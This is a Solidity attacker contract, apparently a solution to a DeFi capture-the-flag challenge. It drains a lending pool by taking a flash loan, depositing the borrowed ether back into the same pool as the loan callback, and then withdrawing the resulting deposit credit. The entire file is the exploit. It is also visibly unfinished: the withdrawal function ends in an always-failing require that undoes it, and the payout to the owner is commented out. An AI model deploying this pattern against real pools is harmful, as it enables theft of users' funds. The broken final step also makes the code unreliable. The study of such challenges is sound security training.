// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderAttacker is Ownable {
    using Address for address payable;
    // using Address for address;

    function attack(address payable pool, uint256 amount) public onlyOwner payable {
        payable(pool).functionCall(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                amount
            )
        );
    }

    function execute() external payable {
        uint256 amount = msg.value;

        // deposit 
        payable(msg.sender).functionCallWithValue(
            abi.encodeWithSignature(
                "deposit()"
            ),
            amount
        );
    }

    function getEther(address payable pool) public onlyOwner payable {
        payable(pool).functionCall(
            abi.encodeWithSignature(
                "withdraw()"
            )
        );  

        require(0 == 1, "going in");

        // payable(owner()).sendValue(address(this).balance);
    }
}